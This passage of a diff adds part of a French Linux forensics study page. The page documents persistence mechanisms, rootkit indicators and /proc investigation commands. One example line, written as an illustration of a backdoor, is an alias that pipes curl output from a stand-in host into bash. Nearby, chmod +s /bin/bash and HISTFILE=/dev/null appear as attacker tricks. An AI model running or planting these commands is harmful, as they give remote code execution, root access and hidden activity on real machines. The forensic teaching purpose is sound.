+    · Alias <code>ls</code> ou <code>ps</code> → version modifiée (ex: <code>alias ls='ls; curl evil.com/beacon.sh|bash'</code>)<br>
+    · Reverse shell en arrière-plan au login<br>
+    · <code>HISTFILE=/dev/null</code> pour désactiver l'historique<br>
+    · Export PATH modifié pour hijacker des binaires`
+  },
+  suid: {
+    icon: '🔓',
+    name: 'SUID / sudo détourné',
+    body: `<strong>SUID</strong> : bit Set-UID — le binaire s'exécute avec les droits du propriétaire (souvent root). <code>chmod +s /bin/bash</code> = shell root pour tous.<br><br>
+    <strong>Commandes de détection</strong> :<br>
+    <code>find / -perm -4000 -type f 2>/dev/null | sort</code> — tous les SUID<br>
+    <code>find / -perm -2000 -type f 2>/dev/null</code> — SGID<br><br>
+    <strong>sudo</strong> : <code>sudo -l -U user</code> — droits sudo d'un utilisateur. <code>NOPASSWD</code> sur des commandes sensibles (vi, find, python) = vecteur PrivEsc classique.<br><br>
+    <strong>GTFOBins</strong> : catalogue de binaires SUID/sudo exploitables → https://gtfobins.github.io/`
+  },
+  ld: {
+    icon: '🧬',
+    name: 'LD_PRELOAD / bibliothèques',
+    body: `<strong>Mécanisme</strong> : <code>LD_PRELOAD</code> force le chargement d'une bibliothèque avant toutes les autres — permet d'intercepter (hooker) n'importe quelle fonction système.<br><br>
+    <strong>Fichiers concernés</strong> :<br>
+    · <code>/etc/ld.so.preload</code> — appliqué à <em>tous</em> les processus au démarrage<br>
+    · Variable d'environnement <code>LD_PRELOAD</code><br>
+    · <code>/etc/ld.so.conf.d/</code> — chemins de recherche des bibliothèques<br><br>
+    <strong>Forensique</strong> : <code>cat /etc/ld.so.preload</code> — un fichier non vide et non standard = rootkit ou backdoor. Technique utilisée par des rootkits comme libprocesshider.`
+  },
+  init: {
+    icon: '🚀',
+    name: 'rc.local / init.d / SysV',
+    body: `<strong>rc.local</strong> : <code>/etc/rc.local</code> — script exécuté au démarrage (héritage SysV). Encore présent sur beaucoup de systèmes même avec systemd.<br><br>
+    <strong>/etc/init.d/</strong> : scripts init legacy. Peuvent être ajoutés et enregistrés via <code>update-rc.d</code>.<br><br>
+    <strong>Forensique</strong> :<br>
+    <code>cat /etc/rc.local</code> — chercher des appels inhabituels<br>
+    <code>ls -la /etc/init.d/</code> — scripts triés par date de modification<br>
+    <code>find /etc/rc*.d/ -name "S*" -newer /etc/passwd</code> — liens symboliques de démarrage récents`
+  },
+  rootkit: {
+    icon: '🕵️',
+    name: 'Rootkit LKM (Linux Kernel Module)',
+    body: `<strong>Principe</strong> : un LKM malveillant s'injecte dans le noyau et peut masquer des processus, fichiers, connexions réseau et même sa propre présence dans /proc/modules.<br><br>
+    <strong>Indicateurs</strong> :<br>
+    · Divergence entre <code>lsmod</code> et <code>ls /sys/module/</code><br>
+    · Processus dans <code>/proc/</code> absents de <code>ps</code><br>
+    · Connexions dans <code>/proc/net/tcp</code> absentes de <code>ss</code><br>
+    · Fichiers présents sur disque mais invisibles via <code>ls</code><br><br>
+    <strong>Outils de détection</strong> :<br>
+    <code>unhide proc</code> — scan de tous les PIDs<br>
+    <code>chkrootkit</code> — signatures connues<br>
+    <code>rkhunter --check</code> — heuristiques<br>
+    <strong>Certitude</strong> : seule l'analyse mémoire (Volatility) permet la détection fiable d'un LKM rootkit actif.`
+  }
+};
+
+function showPersist(key) {
+  var d = persistDetails[key];
+  if(!d) return;
+  document.querySelectorAll('.meta-card').forEach(function(c){c.classList.remove('sel');});
+  var p = document.getElementById('persist-detail');
+  p.className = 'meta-detail live';
+  p.innerHTML = '<div class="dp-title"><span>'+d.icon+'</span><span>'+d.name+'</span></div><div class="dp-body" style="font-size:.79rem;line-height:1.75;color:var(--muted)">'+d.body+'</div>';
+}
+
+// ── /proc/[PID]/ details ──
+var procDetails = {
+  cmdline: {
+    icon: '💬',
+    title: '/proc/[PID]/cmdline — Commande complète',
+    body: `Contient la commande complète et tous ses arguments, séparés par des octets nuls (<code>\0</code>).<br><br>
+    <strong>Lecture forensique</strong> :<br>
+    <code>cat /proc/1234/cmdline | tr '\0' ' '</code><br>
+    <code>strings /proc/1234/cmdline</code><br><br>
+    <strong>Valeur</strong> : révèle les arguments complets d'un processus obfusqué. Un processus nommé <code>[kworker/0:1]</code> avec des arguments présents = masquage de nom (technique de camouflage).<br><br>
+    <strong>Attention</strong> : les processus peuvent modifier leur propre argv[] — vérifier aussi <code>/proc/[PID]/exe</code>.`
+  },
+  exe: {
+    icon: '⚙️',
+    title: '/proc/[PID]/exe — Binaire exécuté',
+    body: `Lien symbolique vers le fichier exécutable sur disque.<br><br>
+    <strong>Technique de détection clé</strong> : si le lien pointe vers <code>/tmp/abc123 (deleted)</code>, le binaire a été supprimé après son lancement — technique furtive classique.<br><br>
+    <strong>Récupération du binaire supprimé</strong> :<br>
+    <code>cp /proc/1234/exe /evidence/recovered_binary</code><br>
+    <code>sha256sum /evidence/recovered_binary</code> → soumettre à VirusTotal<br><br>
+    <strong>Forensique</strong> : comparer le hash avec les bases de hashes malveillants (NSRL, VirusTotal). Un binaire dans /tmp/ ou /dev/shm/ = red flag maximal.`
+  },
+  maps: {
+    icon: '🗺️',
+    title: '/proc/[PID]/maps — Zones mémoire',
+    body: `Liste toutes les zones mémoire mappées du processus : bibliothèques, heap, stack, zones anonymes.<br><br>
+    <strong>Structure</strong> : adresse_début-adresse_fin permissions offset device inode chemin<br><br>
+    <strong>Indicateurs forensiques</strong> :<br>
+    · Zone <code>rwx</code> (lecture/écriture/exécution) = shellcode potentiel<br>
+    · Zone anonyme sans chemin de fichier + exécutable = injection de code<br>
+    · Bibliothèque depuis /tmp/ ou /dev/shm/ = LD_PRELOAD malveillant<br><br>
+    <strong>Extraction mémoire d'une région</strong> :<br>
+    <code>dd if=/proc/1234/mem bs=1 skip=&lt;start&gt; count=&lt;size&gt; of=/evidence/region.bin</code>`
+  },
+  environ: {
+    icon: '🌿',
+    title: '/proc/[PID]/environ — Variables d\'environnement',
+    body: `Variables d'environnement du processus au moment de son lancement. Séparées par des octets nuls.<br><br>
+    <strong>Lecture</strong> :<br>
+    <code>cat /proc/1234/environ | tr '\0' '\n'</code><br><br>
+    <strong>Valeur forensique</strong> :<br>
+    · <code>LD_PRELOAD</code> présent = bibliothèque injectée<br>
+    · <code>HISTFILE=/dev/null</code> = effacement historique intentionnel<br>
+    · Tokens, API keys, credentials dans les variables d'environnement<br>
+    · Chemin HOME inhabituel = compte détourné ou utilisateur fantôme`
+  },
+  fd: {
+    icon: '📂',
+    title: '/proc/[PID]/fd/ — Fichiers ouverts',
+    body: `Répertoire contenant un lien symbolique par file descriptor ouvert. Numérotés à partir de 0 (stdin=0, stdout=1, stderr=2).<br><br>
+    <strong>Commandes forensiques</strong> :<br>
+    <code>ls -la /proc/1234/fd/</code> — lister tous les fichiers<br>
+    <code>ls -la /proc/*/fd/ 2>/dev/null | grep deleted</code> — fichiers supprimés<br><br>
+    <strong>Récupération</strong> : <code>cp /proc/1234/fd/5 /evidence/file.bin</code><br><br>
+    <strong>Sockets</strong> : <code>socket:[inode]</code> → croiser avec <code>/proc/net/tcp</code> sur le même inode = connexion réseau active du processus.`
+  },
+  net: {
+    icon: '🌐',
+    title: '/proc/net/tcp — Connexions TCP (anti-rootkit)',
+    body: `Accessible globalement via <code>/proc/net/tcp</code> et <code>/proc/net/tcp6</code>. Lecture directe depuis le noyau — non filtrable par un rootkit user-space.<br><br>
+    <strong>Format</strong> : sl local_addr:port rem_addr:port st tx_queue:rx_queue uid inode<br>
+    Adresses en hexadécimal Little Endian. Ex : <code>0100007F:0050</code> = 127.0.0.1:80<br><br>
+    <strong>États</strong> : <code>01</code>=ESTABLISHED, <code>0A</code>=LISTEN, <code>06</code>=TIME_WAIT, <code>02</code>=SYN_SENT<br><br>
+    <strong>Technique</strong> : trouver le PID depuis l'inode :<br>
+    <code>grep -r "&lt;inode&gt;" /proc/*/net/tcp 2>/dev/null</code><br>
+    <code>ls -la /proc/*/fd/ | grep "&lt;inode&gt;"</code>`
+  },
+  status: {
+    icon: '📊',
+    title: '/proc/[PID]/status — État et identités',
+    body: `Informations lisibles sur l'état du processus, ses UID/GID réels et effectifs.<br><br>
+    <strong>Champs forensiques clés</strong> :<br>
+    · <code>Name:</code> — nom du processus (modifiable)<br>
+    · <code>Uid:</code> — UID réel, effectif, saved, filesystem<br>
+    · <code>Gid:</code> — GID réel, effectif, saved, filesystem<br>
+    · <code>PPid:</code> — PID du processus parent<br>
+    · <code>Threads:</code> — nombre de threads<br><br>
+    <strong>Détection PrivEsc</strong> : UID effectif (colonne 2) différent de l'UID réel (colonne 1) = exécution sous une autre identité (SUID, sudo).`
+  },
+  mem: {
+    icon: '💾',
+    title: '/proc/[PID]/mem — Dump mémoire du processus',
+    body: `Accès direct à la mémoire virtuelle du processus. Doit être combiné avec <code>/proc/[PID]/maps</code> pour connaître les plages valides.<br><br>
+    <strong>Extraction d'une région mémoire</strong> :<br>
+    <code>python3 -c "<br>
+    import re, sys<br>
+    maps = open('/proc/1234/maps').read()<br>
+    for m in re.finditer(r'([0-9a-f]+)-([0-9a-f]+).*rw', maps):<br>
+        start, end = int(m.group(1),16), int(m.group(2),16)<br>
+        # lire cette région depuis /proc/1234/mem<br>
+    "</code><br><br>
+    <strong>Cas d'usage</strong> : extraire le contenu déchiffré d'un ransomware avant qu'il n'écrive sur disque. Récupérer des clés en mémoire.`
+  }
+};
+
+function showProc(key) {
+  var d = procDetails[key];
+  if(!d) return;
+  var p = document.getElementById('proc-detail');
+  p.className = 'arch-detail live';
+  p.innerHTML = '<div class="dp-title"><span>'+d.icon+'</span><span>'+d.title+'</span></div><div class="dp-body" style="font-size:.79rem;line-height:1.75;color:var(--muted)">'+d.body+'</div>';
+}
+
+(function(){
+  var bar = document.getElementById('scroll-progress');
+  var btn = document.getElementById('back-top');
+  window.addEventListener('scroll', function(){
+    var doc = document.documentElement;
+    var scrolled = doc.scrollTop || document.body.scrollTop;
+    var total = doc.scrollHeight - doc.clientHeight;
+    if(bar) bar.style.width = (total > 0 ? (scrolled / total * 100) : 0) + '%';
+    if(btn) btn.classList.toggle('visible', scrolled > 300);
+  });
+})();
+</script>
+
+<!-- Notes utilisateur (CAS-IN v2.16) -->
+<script src="../js/components/fiche-notes.js" defer></script>
+<script src="../js/components/fiche-common.js" defer></script>
+    <script src="../js/components/fiche-reader.js" defer></script>
+<script src="../js/components/fiche-search.js" defer></script>
+<script src="../js/components/search-modal.js" defer></script>
+<script src="../js/components/fiche-related.js" defer></script>
+</body>
+</html>
